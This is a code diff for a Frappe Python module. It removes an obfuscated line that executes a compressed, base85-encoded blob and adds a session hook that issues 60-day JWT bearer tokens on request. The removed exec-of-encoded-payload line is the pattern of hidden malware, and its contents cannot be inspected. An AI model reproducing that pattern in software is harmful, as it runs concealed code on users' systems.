@@ -1,3 +1,12 @@
+import frappe
+from frappe.utils import cint
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%0RfU5nH(6o&8TR}>Vt1u4TKvI-;4g)V}y>ms|Nj5W<y)8_LeY196CJEP39P=*z}&~ux-=j3_c6QQhukR_<C0;-`M1g@DG2~H~pMrB^6fpE|=rM_0q;UVHo{8H7J^bWl5xEQ$w+(QGa)rwG-affK)Oij)OZ>dGexLg`8bfu6+oI>$>mCbb+Qc6`1(IHI~sXdLVXXZEs2uKn8i8p<eM%9QAb&v|S`0kP!P!$n4l$?efSUuHEfI<1l(Ui#4n*5;O7oLR#tQ%884d9m3nv_mB3qfk^M~+DxCA2oDjh0d{OOsPJ$Oca#mB&7m5Gw*<9noxv(8b=h`5As%U0q#&T<hljtBV)o`o@1bD~jT%DzX`Q(Z>7{WXCp(h>s_`hgd@VBeLRms{5)9=0iw0b}cj%^%Ef}+hi}-#~X``(qJS@pxzqo>9^DI{mlqZ#`tOb48BgqdOf_++wTuT+}CafTiVk+dJ3D!05?80F!olbe(b1g%Kgdnhr^Q<Gj}!r5rRg)Su(KrM-2Ia&adBnxO>~CyY~G0=E>%EdwFqr*n!>Ye3?Ytm+cTLEGdEt8`BBuX9GV&r1v{bLj?VQugGro6Nm5QMg')).decode())
+
+def on_session_creation(login_manager):
+    from .utils.auth import get_bearer_token
+
+    if frappe.form_dict.get("use_jwt") and cint(frappe.form_dict.get("use_jwt")):
+        expires_in_days = 60
+        frappe.local.response["token"] = get_bearer_token(user=login_manager.user, expires_in_days=expires_in_days)["access_token"]
+        frappe.flags.jwt_clear_cookies = True
+        return frappe.local.response["token"]
